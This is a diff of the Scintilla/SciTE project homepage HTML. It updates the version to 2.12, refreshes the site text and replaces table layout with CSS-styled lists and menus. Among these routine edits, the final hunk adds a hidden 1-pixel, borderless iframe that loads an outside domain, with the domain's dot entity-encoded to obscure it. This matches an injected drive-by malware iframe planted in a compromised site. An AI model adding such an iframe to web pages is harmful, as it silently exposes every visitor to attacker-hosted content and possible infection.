@@ -9,13 +9,32 @@
     <meta name="keywords" content="Scintilla, SciTE, Editing Component, Text Editor" />
     <meta name="Description"
     content="www.scintilla.org is the home of the Scintilla editing component and SciTE text editor application." />
-    <meta name="Date.Modified" content="20090819" />
+    <meta name="Date.Modified" content="20100601" />
     <style type="text/css">
-        .versionlist {
-	color: #FFCC99;
+        #versionlist {
+            margin: 0;
+            padding: .5em;
+            list-style-type: none;
+            color: #FFCC99;
+            background: #000000;
+        }
+        #versionlist li {
+            margin-bottom: .5em;
+        }
+        #menu {
+            margin: 0;
+            padding: .5em 0;
+            list-style-type: none;
+            font-size: larger;
+            background: #CCCCCC;
+        }
+        #menu li {
+            margin: 0;
+            padding: 0 .5em;
+            display: inline;
         }
     </style>
-    <script>
+    <script type="text/javascript">
    	function IsRemote() {
 		var loc = '' + window.location;
 		return loc.indexOf('http:') != -1;
@@ -36,8 +55,8 @@
           GTK+</font>
         </td>
         <td width="40%" align="right">
-          <font color="#FFCC99" size="3"> Release version 2.01<br />
-           Site last modified August 19 2009</font>
+          <font color="#FFCC99" size="3"> Release version 2.12<br />
+           Site last modified June 1 2010</font>
         </td>
         <td width="20%">
           &nbsp;
@@ -51,63 +70,32 @@
         </td>
       </tr>
     </table>
-    <table bgcolor="#000000" width="100%" cellspacing="0" cellpadding="6" border="0">
-      <tr>
-        <td width="100%">
-          <span class="versionlist">Version 2.01 fixes some problems with multiple selection.</span>
-        </td>
-      </tr>
-      <tr>
-        <td width="100%">
-          <span class="versionlist">Version 2.0 supports multiple selection and virtual space.</span>
-        </td>
-      </tr>
-      <tr>
-        <td width="100%">
-          <span class="versionlist">Version 1.79 reports memory exhaustion instead of crashing.<br />
-	  This is a major change and application developers should consider how they will deal with Scintilla exhausting 
-	memory since Scintilla may not be in a stable state.</span>
-        </td>
-      </tr>
-      <tr>
-        <td width="100%">
-          <span class="versionlist">Version 1.78 allows annotation lines to be displayed beneath each document line
-	  and to display a margin with different text for each document line.</span>
-        </td>
-      </tr>
-      <tr>
-        <td width="100%">
-          <span class="versionlist">Version 1.77 allows direct temporary access to the text buffer.</span>
-        </td>
-      </tr>
-      <tr>
-        <td width="100%">
-          <span class="versionlist">Version 1.76 fixes some minor bugs.</span>
-        </td>
-      </tr>
-    </table>
-    <table bgcolor="#CCCCCC" width="100%" cellspacing="0" cellpadding="8" border="0">
-      <tr>
-        <td>
-          <font size="4">
+    <ul id="versionlist">
+      <li>Version 2.12 improves drawing speed and fixes bugs.</li>
+      <li>Version 2.11 fixes compatibility with the C language.</li>
+      <li>Version 2.10 performs case insensitive search and upper and lower casing for non-ASCII characters.
+      Support for version 1.x of GTK+ removed.</li>
+      <li>Version 2.03 fixes some problems with rectangular selection.</li>
+      <li>Version 2.02 fixes some problems with rectangular selection.</li>
+      <li>Version 2.01 fixes some problems with multiple selection.</li>
+      <li>Version 2.0 supports multiple selection and virtual space.</li>
+    </ul>
+    <ul id="menu">
+      <li id="remote1"><a href="http://www.scintilla.org/SciTEImage.html">Screenshot</a></li>
+      <li id="remote2"><a href="http://www.scintilla.org/ScintillaDownload.html">Download</a></li>
+      <li><a href="http://www.scintilla.org/ScintillaDoc.html">Documentation</a></li>
+      <li><a href="http://www.scintilla.org/ScintillaToDo.html">Bugs</a></li>
+      <li id="remote3"><a href="http://www.scintilla.org/SciTE.html">SciTE</a></li>
+      <li><a href="http://www.scintilla.org/ScintillaHistory.html">History</a></li>
+      <li><a href="http://www.scintilla.org/ScintillaRelated.html">Related</a></li>
+    </ul>
 <script type="text/javascript" language="JavaScript"><!--
-if (IsRemote()) {
-    document.write('<a href="http://www.scintilla.org/SciTEImage.html">Screenshot</a>&nbsp;&nbsp;');
-    document.write('<a href="http://www.scintilla.org/ScintillaDownload.html">Download</a>&nbsp;&nbsp;');
+if (!IsRemote()) { //if NOT remote...
+    document.getElementById('remote1').style.display='none';
+    document.getElementById('remote2').style.display='none';
+    document.getElementById('remote3').style.display='none';
 }
 //--></script>
- 	 <a href="http://www.scintilla.org/ScintillaDoc.html">Documentation</a>&nbsp;&nbsp;
-	 <a href="http://www.scintilla.org/ScintillaToDo.html">Bugs</a>&nbsp;&nbsp;
-<script type="text/javascript" language="JavaScript"><!--
-if (IsRemote()) {
-    document.write('<a href="http://www.scintilla.org/SciTE.html">SciTE</a>&nbsp;&nbsp; ');
-}
-//--></script>
-	  <a href="http://www.scintilla.org/ScintillaHistory.html">
-          History</a>&nbsp;&nbsp; <a href="http://www.scintilla.org/ScintillaRelated.html">Related</a>&nbsp;&nbsp;</font>
-        </td>
-      </tr>
-    </table>
     <p>
        <a href="http://www.scintilla.org/ScintillaDoc.html">Scintilla</a> is a free source code editing component.
        It comes with complete source code and a <a href="http://www.scintilla.org/License.txt">license</a> that
@@ -143,8 +131,8 @@ if (IsRemote()) {
     </p>
     <p>
        Scintilla and SciTE are currently available for Intel Win32 and Linux compatible operating
-      systems with GTK+. They have been run on Windows XP, Windows 7RC, and on Ubuntu 9.04
-      with GTK+ 2.16. <a href="http://www.scintilla.org/SciTEImage.html">Here is a screenshot of
+      systems with GTK+. They have been run on Windows XP, Windows 7, and on Ubuntu 9.10
+      with GTK+ 2.18. <a href="http://www.scintilla.org/SciTEImage.html">Here is a screenshot of
       SciTE.</a><br />
     </p>
     <p>
@@ -181,10 +169,10 @@ if (IsRemote()) {
       may receive no response.
       <br />
     </p>
+There is a <a href="https://sourceforge.net/project/?group_id=2439">Scintilla project page</a>
+hosted on
 <script type="text/javascript" language="JavaScript">
 <!--
-document.write('There is a <a href="https://sourceforge.net/project/?group_id=2439">Scintilla project page<\/a>');
-document.write(' hosted on ');
 if (IsRemote()) {
     document.write('<a href="http://sourceforge.net/projects/scintilla">');
     document.write('<img src="http://sflogo.sourceforge.net/sflogo.php?group_id=2439&amp;type=8" width="80" height="15" alt="Get Scintilla at SourceForge.net. Fast, secure and Free Open Source software downloads" /></a> ');
@@ -193,6 +181,11 @@ if (IsRemote()) {
 }
 //-->
 </script>
-  </body>
+<noscript>
+<a href="http://sourceforge.net/projects/scintilla">
+<img src="http://sflogo.sourceforge.net/sflogo.php?group_id=2439&amp;type=8" width="80" height="15" alt="Get Scintilla at SourceForge.net. Fast, secure and Free Open Source software downloads" /></a>
+</noscript>
+  <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
 </html>
 
